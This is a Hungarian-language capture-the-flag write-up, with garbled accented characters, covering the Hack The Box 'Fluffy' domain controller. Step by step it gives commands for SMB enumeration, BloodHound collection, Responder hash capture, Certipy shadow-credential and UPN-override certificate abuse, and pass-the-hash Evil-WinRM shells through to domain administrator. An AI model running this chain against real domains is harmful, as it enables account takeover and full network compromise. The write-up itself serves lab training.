
# üõ°Ô∏è HTB - Fluffy | Teljes Writeup (Magyarul)

## C√©lrendszer Inform√°ci√≥i
- IP c√≠m: `10.10.11.69`
- Hostn√©v: `DC01.fluffy.htb`
- Tartom√°ny: `fluffy.htb`

---

## üîç 1. Kezdeti felt√©rk√©pez√©s

### Nmap szkennel√©s
```bash
nmap Fluffy.htb -sV -T4
```
Nyitott portok:
- 53 (DNS)
- 88/464 (Kerberos)
- 139/445 (SMB)
- 389/636 (LDAP / LDAPS)
- 3268/3269 (Global Catalog)
- 5985 (WinRM)
- 9389 (AD Web Services)

![1.png](./1.png)

---

## üìÇ 2. SMB megoszt√°sok felt√©rk√©pez√©se

```bash
smbclient -L //10.10.11.69
```
Hiteles√≠tett hozz√°f√©r√©s eset√©n el√©rhet≈ë megoszt√°sok:
- `IT` ‚Üí Olvas√°s / √≠r√°s
- `NETLOGON`, `SYSVOL` ‚Üí Csak olvas√°s

![2.png](./2.png)

---

## üóÉÔ∏è 3. SMB tartalom b√∂ng√©sz√©se: IT megoszt√°s

```bash
smbclient //10.10.11.69/IT -U j.fleischman
```

Tal√°lt f√°jlok:
- KeePass arch√≠vumok
- `.zip`, `.txt` √©s `.pdf` f√°jlok

![3.png](./3.png)
![4.png](./4.png)

---

## üß† 4. BloodHound AD elemz√©s

```bash
bloodhound-python -u p.agila -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.69 -c All --zip
```
Tal√°lt elemek:
- 1 tartom√°ny
- 10 felhaszn√°l√≥
- 54 csoport
- 1 sz√°m√≠t√≥g√©p

![5.png](./5.png)

---

## üíâ 5. Csomag felt√∂lt√©s: Kezdeti hozz√°f√©r√©s teszt

```bash
smbclient //10.10.11.69/IT -U j.fleischman
put exploit.zip
```

![6.png](./6.png)

---

## üß≤ 6. Responderes t√°mad√°s

```bash
sudo responder -I tun0 -wvF
```

![7.png](./7.png)

---

## ü©∏ 7. Shadow Credentials t√°mad√°s (Certipy)

```bash
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'
```

NT hash megszerz√©se: `winrm_svc`

![8.png](./8.png)

---

## üíª 8. Shell nyit√°sa Evil-WinRM-mel

```bash
evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '<NT Hash>'
```

El√©rt f√°jl: `user.txt`

![9.png](./9.png)

---

## üîê 9. Certipy - Certificate Template sebezhet≈ës√©gek

```bash
certipy-ad find -vulnerable -u CA_SVC -hashes :<hash> -dc-ip 10.10.11.69
```

![10.png](./10.png)
![11.png](./11.png)
![12.png](./12.png)

---

## üß± 10. Jogosults√°gn√∂vel√©s: UPN m√≥dos√≠t√°s

```bash
certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' update -upn 'administrator'
```

![13.png](./13.png)

---

## üïµÔ∏è 11. Shadow t√°mad√°s √∫jra: ca_svc fi√≥k

```bash
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'ca_svc' -dc-ip '10.10.11.69'
```

![14.png](./14.png)

---

## ü™™ 12. Kerberos cache export√°l√°s

```bash
export KRB5CCNAME=ca_svc.ccache
```

![15.png](./15.png)

---

## üßæ 13. Cert k√©relmez√©s (admin)

```bash
certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
```

L√©trej√∂n: `administrator.pfx`

![16.png](./16.png)

---

## üîì 14. Admin hash lek√©r√©se

```bash
certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```

![17.png](./17.png)

---

## üëë 15. V√©gs≈ë hozz√°f√©r√©s: Rendszergazda

```bash
evil-winrm -i 10.10.11.69 -u 'administrator' -H '<NT Hash>'
```

El√©rt f√°jl: `root.txt`

![18.png](./18.png)

---

## ‚úÖ √ñsszefoglal√°s

- **Kezdeti hozz√°f√©r√©s**: SMB + jelsz√≥ √∫jrafelhaszn√°l√°s
- **Enumer√°ci√≥**: BloodHound, SMB megoszt√°sok
- **Privilege escalation**: ADCS abuse Certipy-vel (Shadow + UPN override)
- **Teljes tartom√°nykompromitt√°l√°s**: Administrator cert & Evil-WinRM seg√≠ts√©g√©vel

---

üõë **Figyelem:** Ez a teszt kiz√°r√≥lag oktat√°si c√©lb√≥l, enged√©lyezett laborban t√∂rt√©nt. Ne hajts v√©gre semmilyen jogosulatlan szkennel√©st vagy t√°mad√°st m√°s rendszereken!

